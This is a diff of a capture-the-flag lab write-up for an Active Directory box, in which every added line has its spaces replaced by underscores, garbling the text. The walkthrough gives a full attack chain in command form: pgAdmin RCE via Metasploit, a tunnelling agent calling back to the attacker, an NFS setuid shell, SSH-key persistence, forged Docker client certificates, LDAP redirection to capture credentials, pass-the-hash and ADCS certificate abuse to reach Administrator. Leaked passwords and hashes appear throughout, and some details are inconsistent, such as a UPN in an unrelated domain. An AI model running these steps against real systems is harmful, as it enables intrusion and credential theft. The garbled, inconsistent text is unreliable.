@@ -1,476 +1,476 @@
-Start IP-address: `10.129.244.72`
-Start credentials: `d.cooper@fries.htb : D4LE11maan!!`
-CTF - Insane difficulty 
+Start_IP-address:_`10.129.244.72`
+Start_credentials:_`d.cooper@fries.htb_:_D4LE11maan!!`
+CTF_-_Insane_difficulty_
 
-**Reconnaissance** 
+**Reconnaissance**_
 
 ```
-nmap --top-ports 10000 -sC -sV 10.129.244.72
+nmap_--top-ports_10000_-sC_-sV_10.129.244.72
 ```
 
-It's Active Directory box 
+It's_Active_Directory_box_
 
-Name of domain controller and domain. Added to `/etc/hosts` file
+Name_of_domain_controller_and_domain._Added_to_`/etc/hosts`_file
 ```
 fries.htb
 DC01.fries.htb
 ```
 
-Non-Standart ports runned on DC
+Non-Standart_ports_runned_on_DC
 
 ```
-22/tcp    open  ssh 
-80/tcp    open  http  nginx 1.18.0 (Ubuntu)
-443/tcp   open  ssl/http  nginx 1.18.0 (Ubuntu)
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-2179/tcp  open  vmrdp?
+22/tcp____open__ssh_
+80/tcp____open__http__nginx_1.18.0_(Ubuntu)
+443/tcp___open__ssl/http__nginx_1.18.0_(Ubuntu)
+593/tcp___open__ncacn_http____Microsoft_Windows_RPC_over_HTTP_1.0
+2179/tcp__open__vmrdp?
 ```
 
-clock-skew = 7h
+clock-skew_=_7h
 
 ```
-sudo ntpdate dc01.fries.htb
+sudo_ntpdate_dc01.fries.htb
 ```
 
-`HTTP` port
+`HTTP`_port
 
-In `/about` directory i found a possible usernames
+In_`/about`_directory_i_found_a_possible_usernames
 ```
-Emma Thompson
-Daniel Rodriguez
-Sarah Chen
-```
-
-After crafting possible AD usernames and doing `AS-REP` no one was detected
-
-Discovered a subdomain `code` , add to `/etc/hosts`
-
-```
-ffuf -u http://fries.htb/ -H "Host: FUZZ.fries.htb" -w /home/kali/wordlists/discovery/DNS/subdomains-top1million-20000.txt -fs 154
+Emma_Thompson
+Daniel_Rodriguez
+Sarah_Chen
 ```
 
-In this subdomain exists a `gitea` service , and we can log in with start creds
+After_crafting_possible_AD_usernames_and_doing_`AS-REP`_no_one_was_detected
 
-In app configuration (`README.md`) discovered a new subdomain ``db-mgmt05`` in which is ran a `pgAdmin 4` service database
-For database view  `pgAdmin 4` i must have a `root` pass , i clone this repository to look up for commits
+Discovered_a_subdomain_`code`_,_add_to_`/etc/hosts`
 
 ```
-git log
-git show be59cceb54b56f00778822395bdf656216ab4b9f
+ffuf_-u_http://fries.htb/_-H_"Host:_FUZZ.fries.htb"_-w_/home/kali/wordlists/discovery/DNS/subdomains-top1million-20000.txt_-fs_154
 ```
 
-In intial commit i found a root pass for `postgresql` 
+In_this_subdomain_exists_a_`gitea`_service_,_and_we_can_log_in_with_start_creds
+
+In_app_configuration_(`README.md`)_discovered_a_new_subdomain_``db-mgmt05``_in_which_is_ran_a_`pgAdmin_4`_service_database
+For_database_view__`pgAdmin_4`_i_must_have_a_`root`_pass_,_i_clone_this_repository_to_look_up_for_commits
+
+```
+git_log
+git_show_be59cceb54b56f00778822395bdf656216ab4b9f
+```
+
+In_intial_commit_i_found_a_root_pass_for_`postgresql`_
 
 ```
 DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
 SECRET_KEY=y0st528wn1idjk3b9a
 ```
 
-And with root credentials i logged in database `fries.htb` 
+And_with_root_credentials_i_logged_in_database_`fries.htb`_
 
-Version of `PgAdmin 4`  9.1 is vulnerable to `RCE` with `CVE-2025-2945` 
+Version_of_`PgAdmin_4`__9.1_is_vulnerable_to_`RCE`_with_`CVE-2025-2945`_
 Impact:
-Remote Code Execution security vulnerability in `pgAdmin 4`. The vulnerability is associated with the 2 POST endpoints; `/sqleditor/query_tool/download`, where the `query_commited` parameter and `/cloud/deploy` endpoint, where the high_availability parameter is unsafely passed to the Python eval() function, allowing arbitrary code execution. This issue affects `pgAdmin 4`: before 9.2.
+Remote_Code_Execution_security_vulnerability_in_`pgAdmin_4`._The_vulnerability_is_associated_with_the_2_POST_endpoints; `/sqleditor/query_tool/download`,_where_the_`query_commited`_parameter_and `/cloud/deploy`_endpoint,_where_the_high_availability_parameter_is unsafely_passed_to_the_Python_eval()_function,_allowing_arbitrary_code_execution._This_issue_affects_`pgAdmin_4`:_before_9.2.
 
-I use a module in `matesploit` framework named as `multi/http/pgadmin_query_tool_authenticated`
+I_use_a_module_in_`matesploit`_framework_named_as_`multi/http/pgadmin_query_tool_authenticated`
 
-![](Pasted image 20260214193002.png)
+![](Pasted_image_20260214193002.png)
 
-`Meterpreter` : 
-![](Pasted image 20260214193037.png)
+`Meterpreter`_:_
+![](Pasted_image_20260214193037.png)
 
-And we obtain remote code execution to linux host as `pgadmin`. After enumeration i mentioned that we are in `Docker Container` then i check an environment variables and found a password 
+And_we_obtain_remote_code_execution_to_linux_host_as_`pgadmin`._After_enumeration_i_mentioned_that_we_are_in_`Docker_Container`_then_i_check_an_environment_variables_and_found_a_password_
 
 ```
-> env
+>_env
 Friesf00Ds2025!!
 ```
 
-Also is interesting network in `ifconfig`
+Also_is_interesting_network_in_`ifconfig`
 
-![](Pasted image 20260214211821.png)
+![](Pasted_image_20260214211821.png)
 
-So after tunneling we could have access to local network , i will use a `ligolo-proxy` . When the agent is delivered to target container:
+So_after_tunneling_we_could_have_access_to_local_network_,_i_will_use_a_`ligolo-proxy`_._When_the_agent_is_delivered_to_target_container:
 
-Kali machine:
+Kali_machine:
 ```
-sudo ligolo-proxy -selfcert -laddr '10.10.15.225:443'
-```
-
-Target container:
-```
-./agent -connect 10.10.15.225:443 -retry -ignore-cert
+sudo_ligolo-proxy_-selfcert_-laddr_'10.10.15.225:443'
 ```
 
-Also remembering that i am in AD environment i ping a `DC` to know his interface
-![](Pasted image 20260214212528.png)
-
-So we got two interfaces in local network
-
+Target_container:
 ```
-192.168.100.0/24 # domain exists only 192.168.100.1
-172.18.0.0/24 # containers
+./agent_-connect_10.10.15.225:443_-retry_-ignore-cert
 ```
 
+Also_remembering_that_i_am_in_AD_environment_i_ping_a_`DC`_to_know_his_interface
+![](Pasted_image_20260214212528.png)
 
-After simple enumeration with `nmap` and `ntx` i find a `NFS` ran in `172.18.0.1` host
+So_we_got_two_interfaces_in_local_network
 
-![](Pasted image 20260214213707.png)
+```
+192.168.100.0/24_#_domain_exists_only_192.168.100.1
+172.18.0.0/24_#_containers
+```
+
+
+After_simple_enumeration_with_`nmap`_and_`ntx`_i_find_a_`NFS`_ran_in_`172.18.0.1`_host
+
+![](Pasted_image_20260214213707.png)
 
 Shares:
-![](Pasted image 20260214222316.png)
+![](Pasted_image_20260214222316.png)
 
-Checking a `NFS` shares i mentioned that there is mounted disk and probably for user `srv`
-Mention that root escape in True it's a serious misconfiguration and we can download all files in mounted disk. `/etc/shadow` has `root` access.
-![](Pasted image 20260214214720.png)
+Checking_a_`NFS`_shares_i_mentioned_that_there_is_mounted_disk_and_probably_for_user_`srv`
+Mention_that_root_escape_in_True_it's_a_serious_misconfiguration_and_we_can_download_all_files_in_mounted_disk._`/etc/shadow`_has_`root`_access.
+![](Pasted_image_20260214214720.png)
 
-Main goal of this misconfig to create a new user and add him to `/etc/shadow` and `/etc/passwd` files.
-Create a password hash:
+Main_goal_of_this_misconfig_to_create_a_new_user_and_add_him_to_`/etc/shadow`_and_`/etc/passwd`_files.
+Create_a_password_hash:
 ```
-openssl passwd -6 GreatPassword
-```
-
-![](Pasted image 20260214215736.png)
-Now replace target files in system
-![](Pasted image 20260214223909.png)
-
-It's not worked because in `/etc/exports` we doesn't have a `no_root_squash`
-![](Pasted image 20260214224006.png)
-
-But i have an other trick in this situation . From `/etc/passwd` file we know what users exists in target system the most interesting is `svc` and `barmen` and i tried to brute-force a credentials with existing passwords by ssh connection and we are on
-
-```
-svc : Friesf00Ds2025!!
+openssl_passwd_-6_GreatPassword
 ```
 
-It's an initial foothold in domain but ONLY in ssh so we still need `barmen`
+![](Pasted_image_20260214215736.png)
+Now_replace_target_files_in_system
+![](Pasted_image_20260214223909.png)
 
-On `NFS` share `/srv/web.fries.htb/certs` we got some certificates
-![](Pasted image 20260214225502.png]]![[Pasted image 20260214225647.png)
+It's_not_worked_because_in_`/etc/exports`_we_doesn't_have_a_`no_root_squash`
+![](Pasted_image_20260214224006.png)
 
-And there nothing so the last trick it's to use this `NFS` share so first we need to create the same user as in target system second we need to mount `NFS` share in our kali machine.
-
-User creation from `/etc/passwd` file taken from `NFS`
-```
-sudo useradd -r -u 117 -g 120 -c "Backup and Recovery Manager for PostgreSQL,,," -d /var/lib/barman -s /bin/bash barman
-```
-
-Mounting an `NFS` share to out computer
-```
-mount -t nfs 172.18.0.1:/srv/web.fries.htb /mnt/nfs
-```
-
-Also we get nothing if we want to copy a default `/bin/bash` because of different versions of `GLIBC` so i take a 
+But_i_have_an_other_trick_in_this_situation_._From_`/etc/passwd`_file_we_know_what_users_exists_in_target_system_the_most_interesting_is_`svc`_and_`barmen`_and_i_tried_to_brute-force_a_credentials_with_existing_passwords_by_ssh_connection_and_we_are_on
 
 ```
-sudo apt install bash-static
+svc_:_Friesf00Ds2025!!
 ```
 
-And binary exists in:
+It's_an_initial_foothold_in_domain_but_ONLY_in_ssh_so_we_still_need_`barmen`
+
+On_`NFS`_share_`/srv/web.fries.htb/certs`_we_got_some_certificates
+![](Pasted_image_20260214225502.png]]![[Pasted_image_20260214225647.png)
+
+And_there_nothing_so_the_last_trick_it's_to_use_this_`NFS`_share_so_first_we_need_to_create_the_same_user_as_in_target_system_second_we_need_to_mount_`NFS`_share_in_our_kali_machine.
+
+User_creation_from_`/etc/passwd`_file_taken_from_`NFS`
+```
+sudo_useradd_-r_-u_117_-g_120_-c_"Backup_and_Recovery_Manager_for_PostgreSQL,,,"_-d_/var/lib/barman_-s_/bin/bash_barman
+```
+
+Mounting_an_`NFS`_share_to_out_computer
+```
+mount_-t_nfs_172.18.0.1:/srv/web.fries.htb_/mnt/nfs
+```
+
+Also_we_get_nothing_if_we_want_to_copy_a_default_`/bin/bash`_because_of_different_versions_of_`GLIBC`_so_i_take_a_
+
+```
+sudo_apt_install_bash-static
+```
+
+And_binary_exists_in:
 ```
 /usr/bin/bash-static
 ```
 
-The main goal to create a bash file in `NFS` directory and execute him on target system
+The_main_goal_to_create_a_bash_file_in_`NFS`_directory_and_execute_him_on_target_system
 
-File creation(Kali machine):
+File_creation(Kali_machine):
 ```
-cp /usr/bin/bash-static shell
-chmod +s shell
-```
-
-Execution(target machine):
-```
-./shell -p
+cp_/usr/bin/bash-static_shell
+chmod_+s_shell
 ```
 
-All was done in directory
+Execution(target_machine):
 ```
-/srv/web.fries.htb/shared # target
-/mnt/nfs/shared # kali machine
+./shell_-p
 ```
 
-After shell execution we got a shell as `barmen`. We are `svc` but can do anything what `barmen` can do 
-![](Pasted image 20260215002723.png)
+All_was_done_in_directory
+```
+/srv/web.fries.htb/shared_#_target
+/mnt/nfs/shared_#_kali_machine
+```
 
-Then i like to do `persistance` in target host. I create my own ssh key
+After_shell_execution_we_got_a_shell_as_`barmen`._We_are_`svc`_but_can_do_anything_what_`barmen`_can_do_
+![](Pasted_image_20260215002723.png)
 
-Home `barman` directory
+Then_i_like_to_do_`persistance`_in_target_host._I_create_my_own_ssh_key
+
+Home_`barman`_directory
 ```
 /var/lib/barman
 ```
 
-Create ssh key(kali machine)
+Create_ssh_key(kali_machine)
 ```
-ssh-keygen -t rsa -b 4096
-```
-
-Permisions and creation(target)
-```
-mkdir .ssh
-chmod 700 .ssh
-echo 'ssh-rsa AAAAB <KEY> 4/AHSqXzVQ== kali@kali' >> .ssh/authorized_keys
-chmod 600 .ssh/authorized_keys
+ssh-keygen_-t_rsa_-b_4096
 ```
 
-Log in
+Permisions_and_creation(target)
 ```
-ssh barman@fries.htb -i id_rsa.barmen
-```
-
-Advantage of this that we are fully user `barman` via ssh
-![](Pasted image 20260215005429.png)
-
-Working with `NFS` again our goal in credentials in Active Directory environment and one thing that i mentioned it is certs directory in `NFS` share 
-![](Pasted image 20260215012802.png)
-Interesting group has access named as `Infra Managers` . Previously we discover what exists in this but directory.
-In kali box i see that group which has access to `/certs` named as `59605603`
-![](Pasted image 20260215013139.png)
-
-So i can create this group and add myself , after copy all files
-
-New group creation(kali box)
-```
-sudo groupadd -g 59605603 certgrp
+mkdir_.ssh
+chmod_700_.ssh
+echo_'ssh-rsa_AAAAB_<KEY>_4/AHSqXzVQ==_kali@kali'_>>_.ssh/authorized_keys
+chmod_600_.ssh/authorized_keys
 ```
 
-Add myself
+Log_in
 ```
-sudo usermod -aG 59605603 kali
-```
-
-Group activation
-```
-newgrp certgrp
+ssh_barman@fries.htb_-i_id_rsa.barmen
 ```
 
-id result
+Advantage_of_this_that_we_are_fully_user_`barman`_via_ssh
+![](Pasted_image_20260215005429.png)
+
+Working_with_`NFS`_again_our_goal_in_credentials_in_Active_Directory_environment_and_one_thing_that_i_mentioned_it_is_certs_directory_in_`NFS`_share_
+![](Pasted_image_20260215012802.png)
+Interesting_group_has_access_named_as_`Infra_Managers`_._Previously_we_discover_what_exists_in_this_but_directory.
+In_kali_box_i_see_that_group_which_has_access_to_`/certs`_named_as_`59605603`
+![](Pasted_image_20260215013139.png)
+
+So_i_can_create_this_group_and_add_myself_,_after_copy_all_files
+
+New_group_creation(kali_box)
+```
+sudo_groupadd_-g_59605603_certgrp
+```
+
+Add_myself
+```
+sudo_usermod_-aG_59605603_kali
+```
+
+Group_activation
+```
+newgrp_certgrp
+```
+
+id_result
 ```
 id
-uid=1000(kali) gid=59605603(certgrp) groups=59605603(certgrp),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),107(bluetooth),114(kaboxer),115(wireshark),120(docker),1000(kali)
+uid=1000(kali)_gid=59605603(certgrp)_groups=59605603(certgrp),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),107(bluetooth),114(kaboxer),115(wireshark),120(docker),1000(kali)
 ```
 
-After copy all files 
+After_copy_all_files_
 ```
-kali /mnt/fries3/certs $ cp * /home/kali/htb/machines/Fries/certs 
-```
-
-This certificates in marked as `DockerCA` so probably certificates for a Docker containers so i can create self-signed certificate and get access to docker containers. To get access to docker we must tunnel `2376` to `localhost` we know that port is ran in target from 
-
-```
-ss -tnlp
-LISTEN     0   4096    127.0.0.1:2376      0.0.0.0:*                        
+kali_/mnt/fries3/certs_$_cp_*_/home/kali/htb/machines/Fries/certs_
 ```
 
-Tunneling via ssh
+This_certificates_in_marked_as_`DockerCA`_so_probably_certificates_for_a_Docker_containers_so_i_can_create_self-signed_certificate_and_get_access_to_docker_containers._To_get_access_to_docker_we_must_tunnel_`2376`_to_`localhost`_we_know_that_port_is_ran_in_target_from_
+
 ```
-ssh svc@fries.htb -L 2376:127.0.0.1:2376
+ss_-tnlp
+LISTEN_____0___4096____127.0.0.1:2376______0.0.0.0:*________________________
 ```
 
-Then we need to get access to docker container via new certificate generation
-
-New cert generation
+Tunneling_via_ssh
 ```
-openssl genrsa -out certificate.pem 2048
+ssh_svc@fries.htb_-L_2376:127.0.0.1:2376
 ```
 
-And this will be a docker client's private key
+Then_we_need_to_get_access_to_docker_container_via_new_certificate_generation
 
-Certificate Signing Request creation
+New_cert_generation
 ```
-openssl req -new \
-  -key certificate.pem \
-  -out client-certificate.csr \ 
-  -subj "/CN=root"
+openssl_genrsa_-out_certificate.pem_2048
 ```
 
-Sign the client certificate using the daemon’s CA
+And_this_will_be_a_docker_client's_private_key
+
+Certificate_Signing_Request_creation
 ```
-openssl x509 -req \
-  -in client-certificate.csr \ # created
-  -CA ca.pem \
-  -CAkey ca-key.pem \
-  -CAcreateserial \
-  -out cert.pem \
-  -days 365 \
-  -sha256
+openssl_req_-new_\
+__-key_certificate.pem_\
+__-out_client-certificate.csr_\_
+__-subj_"/CN=root"
+```
+
+Sign_the_client_certificate_using_the_daemon’s_CA
+```
+openssl_x509_-req_\
+__-in_client-certificate.csr_\_#_created
+__-CA_ca.pem_\
+__-CAkey_ca-key.pem_\
+__-CAcreateserial_\
+__-out_cert.pem_\
+__-days_365_\
+__-sha256
 ```
 
 Validation
 ```
-openssl x509 -in cert.pem -noout -text | grep -E "Issuer|Subject"
+openssl_x509_-in_cert.pem_-noout_-text_|_grep_-E_"Issuer|Subject"
 
-openssl verify -CAfile ca.pem cert.pem # CN=root
+openssl_verify_-CAfile_ca.pem_cert.pem_#_CN=root
 ```
 
-Next we must run a container `LOCALY` 
+Next_we_must_run_a_container_`LOCALY`_
 ```
-docker --tlsverify \
-  --tlscacert=ca.pem \
-  --tlscert=cert.pem \
-  --tlskey=certificate.pem \
-  -H=tcp://127.0.0.1:2376 ps
-```
-
-Getting access to container
-```
-docker --tlsverify   --tlscacert=ca.pem  --tlscert=cert.pem --tlskey=certificate.pem \
-  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
+docker_--tlsverify_\
+__--tlscacert=ca.pem_\
+__--tlscert=cert.pem_\
+__--tlskey=certificate.pem_\
+__-H=tcp://127.0.0.1:2376_ps
 ```
 
-![](Pasted image 20260215155402.png)
-
-As we see there `https://pwm.fries.htb` 
-![](Pasted image 20260215155502.png)
-
-There are  configuration file for `LDAPS` connection if we change him to our IP-address and catch him by `responder` maybe we obtain new credentials
-
-Config file searching
+Getting_access_to_container
 ```
-find / -type f -name 'PwmConfiguration.xml' 2>/dev/null
+docker_--tlsverify___--tlscacert=ca.pem__--tlscert=cert.pem_--tlskey=certificate.pem_\
+__-H=tcp://127.0.0.1:2376_exec_-it_f42_/bin/bash
 ```
 
-Location: `/config/PwmConfiguration.xml` 
+![](Pasted_image_20260215155402.png)
 
-![](Pasted image 20260215160832.png)
+As_we_see_there_`https://pwm.fries.htb`_
+![](Pasted_image_20260215155502.png)
 
-I modify file via `sed` because it contains error with `nano` and transferring
-```
-sed -i 's|ldaps://dc01.fries.htb:636|ldap://10.10.15.225:389|' PwmConfiguration.xml
-```
+There_are__configuration_file_for_`LDAPS`_connection_if_we_change_him_to_our_IP-address_and_catch_him_by_`responder`_maybe_we_obtain_new_credentials
 
-Run `responder`
+Config_file_searching
 ```
-sudo responder -I tun0
+find_/_-type_f_-name_'PwmConfiguration.xml'_2>/dev/null
 ```
 
-And we catch a new clear-text credentials
-![](Pasted image 20260215163753.png)
+Location:_`/config/PwmConfiguration.xml`_
 
+![](Pasted_image_20260215160832.png)
+
+I_modify_file_via_`sed`_because_it_contains_error_with_`nano`_and_transferring
 ```
-svc_infra : m6tneOMAh5p0wQ0d
-```
-
-And this credentials is valid for DC authentication 
-
-![](Pasted image 20260215164140.png)
-
-After access to domain `LDAP` i grep information by `bloodhound` 
-```
-bloodhound-python -d fries.htb  -u svc_infra -p m6tneOMAh5p0wQ0d -c all -dc dc01.fries.htb -ns 192.168.100.1
+sed_-i_'s|ldaps://dc01.fries.htb:636|ldap://10.10.15.225:389|'_PwmConfiguration.xml
 ```
 
-NOTE: It must be done through tunneling  
-
-So during enumeration i found a machine account `gMSA_CA_prod$` and user `svc_infra` has privilege to read `GMSA` password 
+Run_`responder`
 ```
-nxc ldap dc01.fries.htb -u svc_infra -p m6tneOMAh5p0wQ0d --gmsa
+sudo_responder_-I_tun0
 ```
 
-![](Pasted image 20260215172859.png)
+And_we_catch_a_new_clear-text_credentials
+![](Pasted_image_20260215163753.png)
 
-New credentials:
 ```
-gMSA_CA_prod$ :   :cb91dc519860daf4ccd15e89e5a9d5ad
-```
-
-Machine account `gMSA_CA_prod$` has `WinRM` to `DC`. Using Pass-The-Hash attack authorize by `WinRM`
-![](Pasted image 20260215173138.png)
-
-
-After simple enum i found a certificate vulnerability in system named
-`ESC6 — EDITF_ATTRIBUTE SUBJECT ALTNAME 2`
-Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.
-
-Configuration with COM API(WinRM)
-
-Using CertificateAuthority.Admin COM object
-```
-$CA = New-Object -ComObject CertificateAuthority.Admin
-$Config = "DC01.fries.htb\fries-DC01-CA"
+svc_infra_:_m6tneOMAh5p0wQ0d
 ```
 
-Calculate a new value and current value
+And_this_credentials_is_valid_for_DC_authentication_
+
+![](Pasted_image_20260215164140.png)
+
+After_access_to_domain_`LDAP`_i_grep_information_by_`bloodhound`_
 ```
-$current = 1114446
-$new = $current -bor 0x00040000
+bloodhound-python_-d_fries.htb__-u_svc_infra_-p_m6tneOMAh5p0wQ0d_-c_all_-dc_dc01.fries.htb_-ns_192.168.100.1
 ```
 
-Apply modification 
+NOTE:_It_must_be_done_through_tunneling__
+
+So_during_enumeration_i_found_a_machine_account_`gMSA_CA_prod$`_and_user_`svc_infra`_has_privilege_to_read_`GMSA`_password_
 ```
-$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
+nxc_ldap_dc01.fries.htb_-u_svc_infra_-p_m6tneOMAh5p0wQ0d_--gmsa
 ```
 
-Then restart CA service
+![](Pasted_image_20260215172859.png)
+
+New_credentials:
 ```
-Restart-Service certsvc -Force
+gMSA_CA_prod$_:___:cb91dc519860daf4ccd15e89e5a9d5ad
+```
+
+Machine_account_`gMSA_CA_prod$`_has_`WinRM`_to_`DC`._Using_Pass-The-Hash_attack_authorize_by_`WinRM`
+![](Pasted_image_20260215173138.png)
+
+
+After_simple_enum_i_found_a_certificate_vulnerability_in_system_named
+`ESC6_—_EDITF_ATTRIBUTE_SUBJECT_ALTNAME_2`
+Principle:_Enables_the_ability_to_specify_an_arbitrary_Subject_Alternative_Name_(SAN)_in_certificate_requests.
+
+Configuration_with_COM_API(WinRM)
+
+Using_CertificateAuthority.Admin_COM_object
+```
+$CA_=_New-Object_-ComObject_CertificateAuthority.Admin
+$Config_=_"DC01.fries.htb\fries-DC01-CA"
+```
+
+Calculate_a_new_value_and_current_value
+```
+$current_=_1114446
+$new_=_$current_-bor_0x00040000
+```
+
+Apply_modification_
+```
+$CA.SetConfigEntry($Config,_"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",_"EditFlags",_$new)
+```
+
+Then_restart_CA_service
+```
+Restart-Service_certsvc_-Force
 ```
 
 Verify
 ```
-certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
+certutil_-config_"DC01.fries.htb\fries-DC01-CA"_-getreg_policy\EditFlags
 ```
 
-![](Pasted image 20260216005318.png)
+![](Pasted_image_20260216005318.png)
 
-Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` = 40000 , means that it is **ENABLED**
+Flag_`EDITF_ATTRIBUTESUBJECTALTNAME2`_=_40000_,_means_that_it_is_**ENABLED**
 
-**ESC6** allows specifying an arbitrary UPN for example `administrator@fries.htb` in the certificate so 
-**ESC16** prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.
+**ESC6**_allows_specifying_an_arbitrary_UPN_for_example_`administrator@fries.htb`_in_the_certificate_so_
+**ESC16**_prevents_SID_validation_in_the_certificate,_allowing_identity_impersonation_Combined,_they_allow_requesting_a_certificate_for_any_user.
 
-After this we run again `certipy-ad` and find a `ESC7` and `ESC16`
-![](Pasted image 20260216010848.png)
+After_this_we_run_again_`certipy-ad`_and_find_a_`ESC7`_and_`ESC16`
+![](Pasted_image_20260216010848.png)
 ```
-certipy-ad find -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -vulnerable -target dc01.fries.htb
-```
-
-I use a `kerberos` authentication 
-```
-impacket-getTGT -hashes ':cb91dc519860daf4ccd15e89e5a9d5ad' fries.htb/gMSA_CA_prod$ -dc-ip 192.168.100.1
+certipy-ad_find_-u_gMSA_CA_prod$@fries.htb_-k_-no-pass_-target-ip__192.168.100.1_-dc-host_dc01.fries.htb_-vulnerable_-target_dc01.fries.htb
 ```
 
-By `ESC7` - User has a dangerous permissions we can add officer to CA `fries-DC01-CA` by user `svc_infra` 
-An officer (Certificate Manager) in Active Directory Certificate Services (AD CS) is a privileged role that can review, approve, deny, and issue certificate requests, effectively controlling the certificate issuance process of the Certification Authority.
-
+I_use_a_`kerberos`_authentication_
 ```
-certipy-ad ca -u gMSA_CA_prod$@fries.htb -k -no-pass -target-ip  192.168.100.1 -dc-host dc01.fries.htb -add-officer svc_infra -ca fries-DC01-CA -target dc01.fries.htb
+impacket-getTGT_-hashes_':cb91dc519860daf4ccd15e89e5a9d5ad'_fries.htb/gMSA_CA_prod$_-dc-ip_192.168.100.1
 ```
 
-Now user `svc_infra` 
-![](Pasted image 20260216015702.png)
+By_`ESC7`_-_User_has_a_dangerous_permissions_we_can_add_officer_to_CA_`fries-DC01-CA`_by_user_`svc_infra`_
+An_officer_(Certificate_Manager)_in_Active_Directory_Certificate_Services_(AD_CS)_is_a_privileged_role_that_can_review,_approve,_deny,_and_issue_certificate_requests,_effectively_controlling_the_certificate_issuance_process_of_the_Certification_Authority.
 
-We cat try to request cert via `SubCA`
-![](Pasted image 20260216020028.png)
-
-This becomes a `ESC6` + `ESC7` certificate exploitation
-##### **ESC6:**
-
-It occurs when a misconfigured template, like ENROLLEE_SUPPLIES_SUBJECT, is accessible to low-privileged users, allowing exploitation without CA access.
-
-##### **ESC7**:
-
-The CA is misconfigured with ACLs (set via certsrv.msc), giving unprivileged users like svc_infra@fries.htb  rights such as ManageCA or ManageCertificates.
-
-
-Request certificate as administrator
 ```
-certipy-ad req -u svc_infra@fries.htb -p 'm6tneOMAh5p0wQ0d' -ca fries-DC01-CA -target 192.168.100.1 -template SubCA -upn administrator@ignite.local -dc-ip 192.168.100.1
+certipy-ad_ca_-u_gMSA_CA_prod$@fries.htb_-k_-no-pass_-target-ip__192.168.100.1_-dc-host_dc01.fries.htb_-add-officer_svc_infra_-ca_fries-DC01-CA_-target_dc01.fries.htb
 ```
 
-Auth as administrator
+Now_user_`svc_infra`_
+![](Pasted_image_20260216015702.png)
+
+We_cat_try_to_request_cert_via_`SubCA`
+![](Pasted_image_20260216020028.png)
+
+This_becomes_a_`ESC6`_+_`ESC7`_certificate_exploitation
+#####_**ESC6:**
+
+It_occurs_when_a_misconfigured_template,_like_ENROLLEE_SUPPLIES_SUBJECT,_is_accessible_to_low-privileged_users,_allowing_exploitation_without_CA_access.
+
+#####_**ESC7**:
+
+The_CA_is_misconfigured_with_ACLs_(set_via_certsrv.msc),_giving_unprivileged_users_like_svc_infra@fries.htb__rights_such_as_ManageCA_or_ManageCertificates.
+
+
+Request_certificate_as_administrator
 ```
-certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.100.1 
+certipy-ad_req_-u_svc_infra@fries.htb_-p_'m6tneOMAh5p0wQ0d'_-ca_fries-DC01-CA_-target_192.168.100.1_-template_SubCA_-upn_administrator@ignite.local_-dc-ip_192.168.100.1
+```
+
+Auth_as_administrator
+```
+certipy-ad_auth_-pfx_administrator.pfx_-dc-ip_192.168.100.1_
 ```
 
 Creds
 ```
-Administrator :  :a773cb05d79273299a684a23ede56748
+Administrator_:__:a773cb05d79273299a684a23ede56748
 ```
 
-![](Pasted image 20260216021842.png)
-And in `C:\Users\Administrator\Desktop` directory exists `user.txt` and `root.txt` 
+![](Pasted_image_20260216021842.png)
+And_in_`C:\Users\Administrator\Desktop`_directory_exists_`user.txt`_and_`root.txt`_
 
-Thanks for reading 
-See you soon
+Thanks_for_reading_
+See_you_soon
 
 Colosion
